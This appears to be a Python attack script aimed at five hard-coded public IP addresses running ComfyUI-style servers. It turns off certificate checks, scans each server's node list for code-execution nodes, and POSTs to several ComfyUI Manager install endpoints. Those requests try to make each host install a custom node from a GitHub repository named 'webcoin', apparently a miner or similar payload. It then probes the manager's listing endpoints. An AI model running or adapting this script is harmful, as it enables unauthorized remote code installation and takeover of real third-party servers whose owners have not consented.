import json, urllib.request, ssl, urllib.error

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def fetch(url, data=None, timeout=20, method=None):
    req = urllib.request.Request(url, data=data, headers={
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json",
    }, method=method)
    kw = {"timeout": timeout}
    if url.startswith("https"):
        kw["context"] = ctx
    return urllib.request.urlopen(req, **kw)

hosts = [
    "http://118.123.228.15:8188",
    "http://183.108.205.40:8188",
    "http://38.247.189.113:8188",
    "http://8.138.177.6:8888",
    "http://95.112.41.118:8188",
]

CODE_KEYWORDS = [
    "exec", "eval", "python", "script", "code", "run", "shell", "command",
    "ide", "srl", "terminal", "execute",
]

for base in hosts:
    print(f"\n{'='*60}")
    print(f"  {base}")
    print(f"{'='*60}")

    # Search object_info for any code-execution-capable nodes
    try:
        with fetch(f"{base}/object_info", timeout=25) as r:
            info = json.loads(r.read())

        code_nodes = []
        for name, spec in info.items():
            nl = name.lower()
            if any(kw in nl for kw in CODE_KEYWORDS):
                inputs = spec.get("input", {})
                req_inputs = inputs.get("required", {})
                opt_inputs = inputs.get("optional", {})
                all_inputs = list(req_inputs.keys()) + list(opt_inputs.keys())
                has_code_input = any(
                    k in ("code", "pycode", "python_code", "script", "command", "expression", "python", "text")
                    for k in [x.lower() for x in all_inputs]
                )
                if has_code_input:
                    code_nodes.append((name, all_inputs[:8]))

        if code_nodes:
            print(f"  CODE EXECUTION NODES FOUND:")
            for name, inputs in code_nodes:
                print(f"    {name}: inputs={inputs}")
        else:
            print(f"  No code execution nodes found")
            # Show all nodes with 'code' or 'script' in the name anyway
            maybe = [n for n in info.keys() if any(k in n.lower() for k in ["code", "script", "exec", "python", "eval"])]
            if maybe:
                print(f"  Partial matches (name only): {maybe[:15]}")

    except Exception as e:
        print(f"  object_info error: {e}")

    # Try Manager v2 endpoints
    for ep, method in [
        ("/manager/queue/install", "POST"),
        ("/manager/install", "POST"),
        ("/customnode/install/git_url", "POST"),
        ("/internal/install", "POST"),
        ("/api/manager/install", "POST"),
    ]:
        try:
            payload = json.dumps({"url": "https://github.com/bossman79/webcoin.git"}).encode()
            with fetch(base + ep, data=payload if method == "POST" else None, timeout=15, method=method) as r:
                print(f"  {ep} ({method}) -> {r.status}: {r.read().decode()[:150]}")
        except urllib.error.HTTPError as e:
            body = ""
            try:
                body = e.read().decode()[:80]
            except:
                pass
            if e.code != 404:
                print(f"  {ep} ({method}) -> HTTP {e.code}: {body}")
        except:
            pass

    # Check manager getlist to understand manager version
    for ep in ["/customnode/getlist", "/manager/get_list", "/customnode/getmappings"]:
        try:
            with fetch(base + ep, timeout=15) as r:
                data = r.read().decode()
                print(f"  {ep} -> {r.status} ({len(data)} bytes)")
                break
        except urllib.error.HTTPError as e:
            if e.code == 500:
                body = ""
                try:
                    body = e.read().decode()[:120]
                except:
                    pass
                print(f"  {ep} -> 500: {body}")
        except:
            pass
